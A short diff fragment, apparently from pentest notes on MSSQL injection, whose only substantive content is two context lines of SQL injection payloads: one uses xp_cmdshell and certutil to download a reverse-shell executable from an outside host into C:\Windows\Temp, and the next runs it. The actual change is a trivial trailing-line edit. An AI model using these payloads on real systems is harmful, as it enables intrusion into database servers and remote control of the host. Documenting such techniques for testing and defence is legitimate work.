@@ -219,4 +219,4 @@ Even when disabled, it can be enabled with an EXEC query if the user has the 'sy
 `'; EXEC xp_cmdshell 'certutil -urlcache -f http://10.18.21.236:8000/win64-reverse.exe C:\Windows\Temp\reverse.exe'; --`
 `'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`
 
-
+ \
